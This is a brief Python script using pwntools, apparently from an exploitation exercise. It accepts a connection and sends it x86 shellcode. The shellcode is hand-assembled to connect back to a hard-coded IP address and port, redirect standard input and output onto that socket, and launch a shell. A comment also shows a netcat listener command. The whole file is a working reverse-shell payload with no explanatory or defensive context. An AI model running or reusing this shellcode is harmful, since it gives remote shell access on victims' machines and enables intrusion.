from pwn import *

# nc -l -p 1330

l = listen(port = 10000)
c = l.wait_for_connection()

sh = """
push   0x0
push   0x1
push   0x2
push   0x66
pop    eax
push   0x1
pop    ebx
mov    ecx,esp
int    0x80
push   0xb9a7718c
push   0x11270002
mov    ecx,esp
push   0x10
push   ecx
push   eax
mov    al,0x66
push   0x3
pop    ebx
mov    ecx,esp
int    0x80
"""

ss = asm(sh)
ss += asm(shellcraft.dup2(4,0))
ss += asm(shellcraft.dup2(4,1))
ss += asm(shellcraft.dup2(4,2))
ss += asm(shellcraft.sh())

c.send(ss)

#c.interactive()
